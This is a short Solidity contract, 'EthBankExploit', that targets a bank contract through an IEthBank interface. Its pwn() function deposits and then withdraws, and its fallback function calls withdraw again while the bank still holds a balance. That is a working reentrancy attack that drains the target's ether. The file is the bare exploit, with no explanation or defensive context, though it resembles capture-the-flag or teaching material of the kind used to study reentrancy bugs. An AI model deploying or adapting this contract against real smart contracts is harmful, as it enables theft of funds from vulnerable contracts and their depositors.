// SPDX-License-Identifier: MIT
pragma solidity 0.7.1;

interface IEthBank {
    function deposit() external payable;

    function withdraw(uint amount) external payable;
}

contract EthBankExploit {
    IEthBank public failedBank;

    constructor(IEthBank _failedBank) {
        failedBank = _failedBank;
    }

    fallback() external payable {
        if (address(failedBank).balance >= 100) {
            failedBank.withdraw(100);
        }
    }

    function pwn() external payable {
        failedBank.deposit{value: 100}();
        failedBank.withdraw(100);
    }
}
